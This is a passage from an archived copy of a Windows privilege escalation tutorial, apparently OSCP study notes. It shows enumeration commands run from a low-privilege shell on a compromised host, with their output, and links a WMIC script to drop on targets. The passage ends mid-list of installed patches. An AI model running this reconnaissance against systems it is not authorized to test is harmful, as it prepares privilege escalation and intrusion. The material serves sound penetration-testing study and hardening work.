<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="keywords" content="OSCP, Privilege Escalation, Security, windows"/><meta name="author" content="Anas"/><meta name="created" content="2018-01-08 16:24:07 +0000"/><meta name="source" content="Clearly"/><meta name="source-url" content="http://www.fuzzysecurity.com/tutorials/16.html"/><meta name="updated" content="2018-01-09 12:44:13 +0000"/><title>Windows Privilege Escalation Fundamentals</title></head><body><div><br/></div><div><a href="https://www.youtube.com/watch?v=PC_iMqiuIRQ">https://www.youtube.com/watch?v=PC_iMqiuIRQ</a></div><div><br/></div><div><div><h1>Windows Privilege Escalation Fundamentals</h1></div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>Not many people talk about serious Windows privilege escalation which is a shame. I think the reasons for this are probably (1) during pentesting engagements a low-priv shell is often all the proof you need for the customer, (2) in staged environments you often pop the Administrator account, (3) meterpreter makes you lazy (getsystem = lazy-fu), (4) build reviews to often end up being --&gt; authenticated nessus scan, microsoft security baseline analyser...</div><div><br/></div><div>Contrary to common perception Windows boxes can be really well locked down if they are configured with care. On top of that the patch time window of opportunity is small. So lets dig into the dark corners of the Windows OS and see if we can get SYSTEM.</div><div><br/></div><div>It should be noted that I'll be using various versions of Windows to highlight any commandline differences that may exist. Keep this in mind as various OS/SP differences may exist in terms of commands not existing or generating slightly different output. I have tried to structure this tutorial so it will apply in the most general way to Windows privilege escalation.</div><div><br/></div><div>Finally I want to give a shout out to my friend Kostas who also really loves post-exploitation, you really don't want him to be logged into your machine hehe.</div><div><br/></div><div>Indispensable Resources:</div><div>Encyclopaedia Of Windows Privilege Escalation (Brett Moore) - <a href="http://www.youtube.com/watch?v=kMG8IsCohHA" target="_blank">here</a>.</div><div>Windows Attacks: AT is the new black (Chris Gates &amp; Rob Fuller) - <a href="http://www.youtube.com/watch?v=_8xJaaQlpBo" target="_blank">here</a>.</div><div>Elevating privileges by exploiting weak folder permissions (Parvez Anwar) - <a href="http://www.greyhathacker.net/?p=738" target="_blank">here</a>.</div></div><h2>Î”t for t0 to t3 - Initial Information Gathering</h2><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>The starting point for this tutorial is an unprivileged shell on a box. We might have used a remote exploit or a client-side attack and we got a shell back. Basically at time t0 we have no understanding of the machine, what it does, what it is connected to, what level of privilege we have or even what operating system it is.</div><div><br/></div><div>Initially we will want to quickly gather some essential information so we can get a lay of the land and asses our situation.</div><div><br/></div><div>First let's find out what OS we are connected to:</div></div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">Next we will see what the hostname is of the box and what user we are connected as.</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">Now we have this basic information we list the other user accounts on the box and view our own user's information in a bit more detail. We can already see that user1 is not part of the localgroup Administrators.</div><div>C:\Windows\system32&gt; net users</div><div><br/></div><div>User accounts for \\B33F</div><div><br/></div><div>-------------------------------------------------------------------------------</div><div>Administrator            b33f                     Guest</div><div>user1</div><div>The command completed successfully.</div><div><br/></div><div>C:\Windows\system32&gt; net user user1</div><div><br/></div><div>User name                    user1</div><div>Full Name</div><div>Comment</div><div>User's comment</div><div>Country code                 000 (System Default)</div><div>Account active               Yes</div><div>Account expires              Never</div><div><br/></div><div>Password last set            1/11/2014 7:47:14 PM</div><div>Password expires             Never</div><div>Password changeable          1/11/2014 7:47:14 PM</div><div>Password required            Yes</div><div>User may change password     Yes</div><div><br/></div><div>Workstations allowed         All</div><div>Logon script</div><div>User profile</div><div>Home directory</div><div>Last logon                   1/11/2014 8:05:09 PM</div><div><br/></div><div>Logon hours allowed          All</div><div><br/></div><div>Local Group Memberships      *Users</div><div>Global Group memberships     *None</div><div>The command completed successfully.</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>That is all we need to know about users and permissions for the moment. Next on our list is networking, what is the machine connected to and what rules does it impose on those connections.</div><div><br/></div><div>First let's have a look at the available network interfaces and routing table.</div></div><div>C:\Windows\system32&gt; ipconfig /all</div><div><br/></div><div>Windows IP Configuration</div><div><br/></div><div>   Host Name . . . . . . . . . . . . : b33f</div><div>   Primary Dns Suffix  . . . . . . . :</div><div>   Node Type . . . . . . . . . . . . : Hybrid</div><div>   IP Routing Enabled. . . . . . . . : No</div><div>   WINS Proxy Enabled. . . . . . . . : No</div><div><br/></div><div>Ethernet adapter Bluetooth Network Connection:</div><div><br/></div><div>   Media State . . . . . . . . . . . : Media disconnected</div><div>   Connection-specific DNS Suffix  . :</div><div>   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)</div><div>   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29</div><div>   DHCP Enabled. . . . . . . . . . . : Yes</div><div>   Autoconfiguration Enabled . . . . : Yes</div><div   /><div>Ethernet adapter Local Area Connection:</div><div><br/></div><div>   Connection-specific DNS Suffix  . :</div><div>   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection</div><div>   Physical Address. . . . . . . . . : 00-0C-29-56-79-35</div><div>   DHCP Enabled. . . . . . . . . . . : Yes</div><div>   Autoconfiguration Enabled . . . . : Yes</div><div>   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)</div><div>   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)</div><div>   Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div>   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM</div><div>   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM</div><div>   Default Gateway . . . . . . . . . : 192.168.0.1</div><div>   DHCP Server . . . . . . . . . . . : 192.168.0.1</div><div>   DHCPv6 IAID . . . . . . . . . . . : 234884137</div><div>   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35</div><div>   DNS Servers . . . . . . . . . . . : 192.168.0.1</div><div>   NetBIOS over Tcpip. . . . . . . . : Enabled</div><div><br/></div><div>C:\Windows\system32&gt; route print</div><div><br/></div><div>===========================================================================</div><div>Interface List</div><div> 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network)</div><div> 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9</div><div> 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection</div><div>  1...........................Software Loopback Interface 1</div><div> 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter</div><div> 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2</div><div> 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3</div><div> 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface</div><div>===========================================================================</div><div><br/></div><div>IPv4 Route Table</div><div>===========================================================================</div><div>Active Routes:</div><div>Network Destination        Netmask          Gateway       Interface  Metric</div><div>          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10</div><div>        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306</div><div>        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306</div><div>  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div>      192.168.0.0    255.255.255.0         On-link     192.168.0.104    266</div><div>    192.168.0.104  255.255.255.255         On-link     192.168.0.104    266</div><div>    192.168.0.255  255.255.255.255         On-link     192.168.0.104    266</div><div>        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306</div><div>        224.0.0.0        240.0.0.0         On-link     192.168.0.104    266</div><div>  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div>  255.255.255.255  255.255.255.255         On-link     192.168.0.104    266</div><div>===========================================================================</div><div>Persistent Routes:</div><div>  None</div><div><br/></div><div>IPv6 Route Table</div><div>===========================================================================</div><div>Active Routes:</div><div> If Metric Network Destination      Gateway</div><div> 14     58 ::/0                     On-link</div><div>  1    306 ::1/128                  On-link</div><div> 14     58 2001::/32                On-link</div><div> 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128</div><div>                                    On-link</div><div> 11    266 fe80::/64                On-link</div><div> 14    306 fe80::/64                On-link</div><div> 14    306 fe80::8d2:b4e:3f57:ff97/128</div><div>                                    On-link</div><div> 11    266 fe80::5cd4:9caf:61c0:ba6e/128</div><div>                                    On-link</div><div>  1    306 ff00::/8                 On-link</div><div> 14    306 ff00::/8                 On-link</div><div> 11    266 ff00::/8                 On-link</div><div>===========================================================================</div><div>Persistent Routes:</div><div>  None</div><div  /><div><span style="font-weight: bold;"># arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.</span></div><div><br/></div><div>C:\Windows\system32&gt; arp -A</div><div><br/></div><div>Interface: 192.168.0.104 --- 0xb</div><div>  Internet Address      Physical Address      Type</div><div>  192.168.0.1           90-94-e4-c5-b0-46     dynamic</div><div>  192.168.0.101         ac-22-0b-af-bb-43     dynamic</div><div>  192.168.0.255         ff-ff-ff-ff-ff-ff     static</div><div>  224.0.0.22            01-00-5e-00-00-16     static</div><div>  224.0.0.251           01-00-5e-00-00-fb     static</div><div>  224.0.0.252           01-00-5e-00-00-fc     static</div><div>  239.255.255.250       01-00-5e-7f-ff-fa     static</div><div>  255.255.255.255       ff-ff-ff-ff-ff-ff     static</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">That brings us to the active network connections and the firewall rules.</div><div>C:\Windows\system32&gt; netstat -ano</div><div><br/></div><div>Active Connections</div><div><br/></div><div>  Proto  Local Address          Foreign Address        State           PID</div><div>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684</div><div>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</div><div>  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</div><div>  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1400</div><div>  TCP    192.168.0.104:139      0.0.0.0:0              LISTENING       4</div><div>  TCP    [::]:135               [::]:0                 LISTENING       684</div><div>  TCP    [::]:445               [::]:0                 LISTENING       4</div><div>  TCP    [::]:5357              [::]:0                 LISTENING       4</div><div>  UDP    0.0.0.0:5355           *:*                                    1100</div><div>  UDP    0.0.0.0:52282          *:*                                    976</div><div>  UDP    0.0.0.0:55202          *:*                                    2956</div><div>  UDP    0.0.0.0:59797          *:*                                    1400</div><div>  UDP    127.0.0.1:1900         *:*                                    2956</div><div>  UDP    127.0.0.1:65435        *:*                                    2956</div><div>  UDP    192.168.0.104:137      *:*                                    4</div><div>  UDP    192.168.0.104:138      *:*                                    4</div><div>  UDP    192.168.0.104:1900     *:*                                    2956</div><div>  UDP    192.168.0.104:5353     *:*                                    1400</div><div>  UDP    192.168.0.104:65434    *:*                                    2956</div><div>  UDP    [::]:5355              *:*                                    1100</div><div>  UDP    [::]:52281             *:*                                    976</div><div>  UDP    [::]:52283             *:*                                    976</div><div>  UDP    [::]:55203             *:*                                    2956</div><div>  UDP    [::]:59798             *:*                                    1400</div><div>  UDP    [::1]:1900             *:*                                    2956</div><div>  UDP    [::1]:5353             *:*                                    1400</div><div>  UDP    [::1]:65433            *:*                                    2956</div><div>  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956</div><div>  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956</div><div  /><div><span style="font-weight: bold;"># The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh</span></div><div><span style="font-weight: bold;">firewall commands are only available from XP SP2 and upwards.</span></div><div><br/></div><div>C:\Windows\system32&gt; netsh firewall show state</div><div><br/></div><div>Firewall status:</div><div>-------------------------------------------------------------------</div><div>Profile                           = Standard</div><div>Operational mode                  = Enable</div><div>Exception mode                    = Enable</div><div>Multicast/broadcast response mode = Enable</div><div>Notification mode                 = Enable</div><div>Group policy version              = Windows Firewall</div><div>Remote admin mode                 = Disable</div><div><br/></div><div>Ports currently open on all network interfaces:</div><div>Port   Protocol  Version  Program</div><div>-------------------------------------------------------------------</div><div>No ports are currently open on all network interfaces.</div><div><br/></div><div>C:\Windows\system32&gt; netsh firewall show config</div><div><br/></div><div>Domain profile configuration:</div><div>-------------------------------------------------------------------</div><div>Operational mode                  = Enable</div><div>Exception mode                    = Enable</div><div>Multicast/broadcast response mode = Enable</div><div>Notification mode                 = Enable</div><div><br/></div><div>Allowed programs configuration for Domain profile:</div><div>Mode     Traffic direction    Name / Program</div><div>-------------------------------------------------------------------</div><div><br/></div><div>Port configuration for Domain profile:</div><div>Port   Protocol  Mode    Traffic direction     Name</div><div>-------------------------------------------------------------------</div><div><br/></div><div>ICMP configuration for Domain profile:</div><div>Mode     Type  Description</div><div>-------------------------------------------------------------------</div><div>Enable   2     Allow outbound packet too big</div><div><br/></div><div>Standard profile configuration (current):</div><div>-------------------------------------------------------------------</div><div>Operational mode                  = Enable</div><div>Exception mode                    = Enable</div><div>Multicast/broadcast response mode = Enable</div><div>Notification mode                 = Enable</div><div><br/></div><div>Service configuration for Standard profile:</div><div>Mode     Customized  Name</div><div>-------------------------------------------------------------------</div><div>Enable   No          Network Discovery</div><div><br/></div><div>Allowed programs configuration for Standard profile:</div><div>Mode     Traffic direction    Name / Program</div><div>-------------------------------------------------------------------</div><div>Enable   Inbound              COMRaider / E:\comraider\comraider.exe</div><div>Enable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exe</div><div><br/></div><div>Port configuration for Standard profile:</div><div>Port   Protocol  Mode    Traffic direction     Name</div><div>-------------------------------------------------------------------</div><div><br/></div><div>ICMP configuration for Standard profile:</div><div>Mode     Type  Description</div><div>-------------------------------------------------------------------</div><div>Enable   2     Allow outbound packet too big</div><div><br/></div><div>Log configuration:</div><div>-------------------------------------------------------------------</div><div>File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log</div><div>Max file size   = 4096 KB</div><div>Dropped packets = Disable</div><div>Connections     = Disable</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">Finally we will take a brief look at the what is running on the compromised box: scheduled tasks, running processes, started services and installed drivers.</div><div><span style="font-weight: bold;"># This will display verbose output for all scheduled tasks, below you can see sample output for a</span></div><div><span style="font-weight: bold;">single task.</span></div><div><br/></div><div>C:\Windows\system32&gt; schtasks /query /fo LIST /v</div><div><br/></div><div>Folder: \Microsoft\Windows Defender</div><div>HostName:                             B33F</div><div>TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan</div><div>Next Run Time:                        1/22/2014 5:11:13 AM</div><div>Status:                               Ready</div><div>Logon Mode:                           Interactive/Background</div><div>Last Run Time:                        N/A</div><div>Last Result:                          1</div><div>Author:                               N/A</div><div>Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob</div><div>                                      -WinTask -RestrictPrivilegesScan</div><div>Start In:                             N/A</div><div>Comment:                              Scheduled Scan</div><div>Scheduled Task State:                 Enabled</div><div>Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes</div><div>Power Management:                     No Start On Batteries</div><div>Run As User:                          SYSTEM</div><div>Delete Task If Not Rescheduled:       Enabled</div><div>Stop Task If Runs X Hours and X Mins: 72:00:00</div><div>Schedule:                             Scheduling data is not available in this format.</div><div>Schedule Type:                        Daily</div><div>Start Time:                           5:11:13 AM</div><div>Start Date:                           1/1/2000</div><div>End Date:                             1/1/2100</div><div>Days:                                 Every 1 day(s)</div><div>Months:                               N/A</div><div>Repeat: Every:                        Disabled</div><div>Repeat: Until: Time:                  Disabled</div><div>Repeat: Until: Duration:              Disabled</div><div>Repeat: Stop If Still Running:        Disabled</div><div>[..Snip..]</div><div><br/></div><div><span style="font-weight: bold;"># The following command links running processes to started services.</span></div><div><br/></div><div>C:\Windows\system32&gt; tasklist /SVC</div><div><br/></div><div>Image Name                     PID Services</div><div>========================= ======== ============================================</div><div>System Idle Process              0 N/A</div><div>System                           4 N/A</div><div>smss.exe                       244 N/A</div><div>csrss.exe                      332 N/A</div><div>csrss.exe                      372 N/A</div><div>wininit.exe                    380 N/A</div><div>winlogon.exe                   428 N/A</div><div>services.exe                   476 N/A</div><div>lsass.exe                      484 SamSs</div><div>lsm.exe                        496 N/A</div><div>svchost.exe                    588 DcomLaunch, PlugPlay, Power</div><div>svchost.exe                    668 RpcEptMapper, RpcSs</div><div>svchost.exe                    760 Audiosrv, Dhcp, eventlog,</div><div>                                   HomeGroupProvider, lmhosts, wscsvc</div><div>svchost.exe                    800 AudioEndpointBuilder, CscService, Netman,</div><div>                                   SysMain, TrkWks, UxSms, WdiSystemHost,</div><div>                                   wudfsvc</div><div>svchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,</div><div>                                   LanmanServer, MMCSS, ProfSvc, Schedule,</div><div>                                   seclogon, SENS, ShellHWDetection, Themes,</div><div>                                   Winmgmt, wuauserv</div><div>audiodg.exe                    916 N/A</div><div>svchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,</div><div>                                   WdiServiceHost, WinHttpAutoProxySvc</div><div>svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,</div><div>                                   NlaSvc</div><div>spoolsv.exe                   1244 Spooler</div><div>svchost.exe                   1272 BFE, DPS, MpsSvc</div><div>mDNSResponder.exe             1400 Bonjour Service</div><div>taskhost.exe                  1504 N/A</div><div>taskeng.exe                   1556 N/A</div><div>vmtoolsd.exe                  1580 VMTools</div><div>dwm.exe                       1660 N/A</div><div>explorer.exe                  1668 N/A</div><div>vmware-usbarbitrator.exe      1768 VMUSBArbService</div><div>TPAutoConnSvc.exe             1712 TPAutoConnSvc</div><div>[..Snip..]</div><div><br/></div><div>C:\Windows\system32&gt; net start</div><div><br/></div><div>These Windows services are started:</div><div><br/></div><div>   Application Experience</div><div>   Application Information</div><div>   Background Intelligent Transfer Service</div><div>   Base Filtering Engine</div><div>   Bluetooth Support Service</div><div>   Bonjour Service</div><div>   COM+ Event System</div><div>   COM+ System Application</div><div>   Cryptographic Services</div><div>   DCOM Server Process Launcher</div><div>   Desktop Window Manager Session Manager</div><div>   DHCP Client</div><div>   Diagnostic Policy Service</div><div>   Diagnostic Service Host</div><div>   Diagnostic System Host</div><div>   Distributed Link Tracking Client</div><div>   Distributed Transaction Coordinator</div><div>   DNS Client</div><div>   Function Discovery Provider Host</div><div>   Function Discovery Resource Publication</div><div>   Group Policy Client</div><div>[..Snip..]</div><div   /><div><span style="font-weight: bold;"># This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes</span></div><div><span style="font-weight: bold;">than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.</span></div><div><br/></div><div>C:\Windows\system32&gt; DRIVERQUERY</div><div><br/></div><div>Module Name  Display Name           Driver Type   Link Date</div><div>============ ====================== ============= ======================</div><div>1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PM</div><div>ACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PM</div><div>AcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PM</div><div>adp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AM</div><div>adpahci      adpahci                Kernel        5/2/2007 1:29:26 AM</div><div>adpu320      adpu320                Kernel        2/28/2007 8:03:08 AM</div><div>AFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PM</div><div>agp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AM</div><div>aic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AM</div><div>aliide       aliide                 Kernel        7/14/2009 7:11:17 AM</div><div>amdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AM</div><div>amdide       amdide                 Kernel        7/14/2009 7:11:19 AM</div><div>AmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AM</div><div>AmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AM</div><div>amdsata      amdsata                Kernel        3/19/2010 9:08:27 AM</div><div>amdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AM</div><div>amdxata      amdxata                Kernel        3/20/2010 12:19:01 AM</div><div>AppID        AppID Driver           Kernel        11/20/2010 5:29:48 PM</div><div>arc          arc                    Kernel        5/25/2007 5:31:06 AM</div><div>[..Snip..]</div><h2>Î”t for t4 - The Arcane Arts Of WMIC</h2><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>I want to mention WMIC (Windows Management Instrumentation Command-Line) separately as it is Windows most useful command line tool. WIMIC can be very practical for information gathering and post-exploitation. That being said it is a bit clunky and the output leaves much to be desired for.</div><div><br/></div><div>Fully explaining the use of WMIC would take a tutorial all of it's own. Not to mention that some of the output would be difficult to display due to the formatting.</div><div><br/></div><div>I have listed two resources below that are well worth reading on the subject matter:</div><div>Command-Line Ninjitsu (SynJunkie) - <a href="http://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html" target="_blank">here</a></div><div>Windows WMIC Command Line (ComputerHope) - <a href="http://www.computerhope.com/wmic.htm" target="_blank">here</a></div><div><br/></div><div>Unfortunately some default configurations of windows do not allow access to WMIC unless the user is in the Administrators group (which is probably a really good idea). From my testing with VM's I noticed that any version of XP did not allow access to WMIC from a low privileged account. Contrary, default installations of Windows 7 Professional and Windows 8 Enterprise allowed low privilege users to use WMIC and query the operating system without modifying any settings. This is exactly what we need as we are using WMIC to gather information about the target machine.</div><div><br/></div><div>To give you an idea about the extensive options that WMIC has I have listed the available command line switches below.</div></div><div>C:\Windows\system32&gt; wmic /?</div><div><br/></div><div>[global switches] </div><div><br/></div><div>The following global switches are available:</div><div>/NAMESPACE           Path for the namespace the alias operate against.</div><div>/ROLE                Path for the role containing the alias definitions.</div><div>/NODE                Servers the alias will operate against.</div><div>/IMPLEVEL            Client impersonation level.</div><div>/AUTHLEVEL           Client authentication level.</div><div>/LOCALE              Language id the client should use.</div><div>/PRIVILEGES          Enable or disable all privileges.</div><div>/TRACE               Outputs debugging information to stderr.</div><div>/RECORD              Logs all input commands and output.</div><div>/INTERACTIVE         Sets or resets the interactive mode.</div><div>/FAILFAST            Sets or resets the FailFast mode.</div><div>/USER                User to be used during the session.</div><div>/PASSWORD            Password to be used for session login.</div><div>/OUTPUT              Specifies the mode for output redirection.</div><div>/APPEND              Specifies the mode for output redirection.</div><div>/AGGREGATE           Sets or resets aggregate mode.</div><div>/AUTHORITY           Specifies the  for the connection.</div><div>/?[:&lt;BRIEF|FULL&gt;]    Usage information.</div><div><br/></div><div>For more information on a specific global switch, type: switch-name /?</div><div><br/></div><div><br/></div><div>The following alias/es are available in the current role:</div><div>ALIAS                    - Access to the aliases available on the local system</div><div>BASEBOARD                - Base board (also known as a motherboard or system board) management.</div><div>BIOS                     - Basic input/output services (BIOS) management.</div><div>BOOTCONFIG               - Boot configuration management.</div><div>CDROM                    - CD-ROM management.</div><div>COMPUTERSYSTEM           - Computer system management.</div><div>CPU                      - CPU management.</div><div>CSPRODUCT                - Computer system product information from SMBIOS.</div><div>DATAFILE                 - DataFile Management.</div><div>DCOMAPP                  - DCOM Application management.</div><div>DESKTOP                  - User's Desktop management.</div><div>DESKTOPMONITOR           - Desktop Monitor management.</div><div>DEVICEMEMORYADDRESS      - Device memory addresses management.</div><div>DISKDRIVE                - Physical disk drive management.</div><div>DISKQUOTA                - Disk space usage for NTFS volumes.</div><div>DMACHANNEL               - Direct memory access (DMA) channel management.</div><div>ENVIRONMENT              - System environment settings management.</div><div>FSDIR                    - Filesystem directory entry management.</div><div>GROUP                    - Group account management.</div><div>IDECONTROLLER            - IDE Controller management.</div><div>IRQ                      - Interrupt request line (IRQ) management.</div><div>JOB                      - Provides  access to the jobs scheduled using the schedule service.</div><div>LOADORDER                - Management of system services that define execution dependencies.</div><div>LOGICALDISK              - Local storage device management.</div><div>LOGON                    - LOGON Sessions.</div><div>MEMCACHE                 - Cache memory management.</div><div>MEMORYCHIP               - Memory chip information.</div><div>MEMPHYSICAL              - Computer system's physical memory management.</div><div>NETCLIENT                - Network Client management.</div><div>NETLOGIN                 - Network login information (of a particular user) management.</div><div>NETPROTOCOL              - Protocols (and their network characteristics) management.</div><div>NETUSE                   - Active network connection management.</div><div>NIC                      - Network Interface Controller (NIC) management.</div><div>NICCONFIG                - Network adapter management.</div><div>NTDOMAIN                 - NT Domain management.</div><div>NTEVENT                  - Entries in the NT Event Log.</div><div>NTEVENTLOG               - NT eventlog file management.</div><div>ONBOARDDEVICE            - Management of common adapter devices built into the motherboard (system board).</div><div>OS                       - Installed Operating System/s management.</div><div>PAGEFILE                 - Virtual memory file swapping management.</div><div>PAGEFILESET              - Page file settings management.</div><div>PARTITION                - Management of partitioned areas of a physical disk.</div><div>PORT                     - I/O port management.</div><div>PORTCONNECTOR            - Physical connection ports management.</div><div>PRINTER                  - Printer device management.</div><div>PRINTERCONFIG            - Printer device configuration management.</div><div>PRINTJOB                 - Print job management.</div><div>PROCESS                  - Process management.</div><div>PRODUCT                  - Installation package task management.</div><div>QFE                      - Quick Fix Engineering.</div><div>QUOTASETTING             - Setting information for disk quotas on a volume.</div><div>RDACCOUNT                - Remote Desktop connection permission management.</div><div>RDNIC                    - Remote Desktop connection management on a specific network adapter.</div><div>RDPERMISSIONS            - Permissions to a specific Remote Desktop connection.</div><div>RDTOGGLE                 - Turning Remote Desktop listener on or off remotely.</div><div>RECOVEROS                - Information that will be gathered from memory when the operating system fails.</div><div>REGISTRY                 - Computer system registry management.</div><div>SCSICONTROLLER           - SCSI Controller management.</div><div>SERVER                   - Server information management.</div><div>SERVICE                  - Service application management.</div><div>SHADOWCOPY               - Shadow copy management.</div><div>SHADOWSTORAGE            - Shadow copy storage area management.</div><div>SHARE                    - Shared resource management.</div><div>SOFTWAREELEMENT          - Management of the  elements of a software product installed on a system.</div><div>SOFTWAREFEATURE          - Management of software product subsets of SoftwareElement.</div><div>SOUNDDEV                 - Sound Device management.</div><div>STARTUP                  - Management of commands that run automatically when users log onto the computer </div><div>                           system.</div><div>SYSACCOUNT               - System account management.</div><div>SYSDRIVER                - Management of the system driver for a base service.</div><div>SYSTEMENCLOSURE          - Physical system enclosure management.</div><div>SYSTEMSLOT               - Management of physical connection points including ports,  slots and </div><div>                           peripherals, and proprietary connections points.</div><div>TAPEDRIVE                - Tape drive management.</div><div>TEMPERATURE              - Data management of a temperature sensor (electronic thermometer).</div><div>TIMEZONE                 - Time zone data management.</div><div>UPS                      - Uninterruptible power supply (UPS) management.</div><div>USERACCOUNT              - User account management.</div><div>VOLTAGE                  - Voltage sensor (electronic voltmeter) data management.</div><div>VOLUME                   - Local storage volume management.</div><div>VOLUMEQUOTASETTING       - Associates the disk quota setting with a specific disk volume.</div><div>VOLUMEUSERQUOTA          - Per user storage volume quota management.</div><div>WMISET                   - WMI service operational parameters management.</div><div><br/></div><div>For more information on a specific alias, type: alias /?</div><div><br/></div><div>CLASS     - Escapes to full WMI schema.</div><div>PATH      - Escapes to full WMI object paths.</div><div>CONTEXT   - Displays the state of all the global switches.</div><div>QUIT/EXIT - Exits the program.</div><div><br/></div><div>For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /?</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>To simplify things I have created a script which can be dropped on the target machine and which will use WMIC to extract the following information: processes, services, user accounts, user groups, network interfaces, Hard Drive information, Network Share information, installed Windows patches, programs that run at startup, list of installed software, information about the operating system and timezone.</div><div><br/></div><div>I have gone through the various flags and parameters to extract the valuable pieces of information if anyone thinks of something that should be added to the list please leave a comment below. Using the built-in output features the script will write all results to a human readable html file.</div><div><br/></div><div>You can download my script (wmic_info.bat) - <a href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank">here</a></div><div>Sample output file on a Windows 7 VM (badly patched) - <a href="http://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank">here</a></div></div><h2>Î”t for t5 to t6 - Quick Fails</h2><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>Before continuing on you should take a moment to review the information that you have gathered so far as there should be quite a bit by now. The next step in our gameplan is to look for some quick security fails which can be easily leveraged to upgrade our user privileges.</div><div><br/></div><div>The first and most obvious thing we need to look at is the patchlevel. There is no need to worry ourself further if we see that the host is badly patched. My WMIC script will already list all the installed patches but you can see the sample command line output below.</div></div><div>C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div><br/></div><div>Caption                                     Description      HotFixID   InstalledOn</div><div>http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013</div><div>http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013</div><div>http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013</div><div>http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013</div><div>http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013</div><div>http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013</div><div>http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013</div><div>http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013</div><div>http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013</div><div>http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013</div><div>http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013</div><div>http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013</div><div>http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013</div><div>http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013</div><div>http://support.microsoft.com/?kbid=2769034  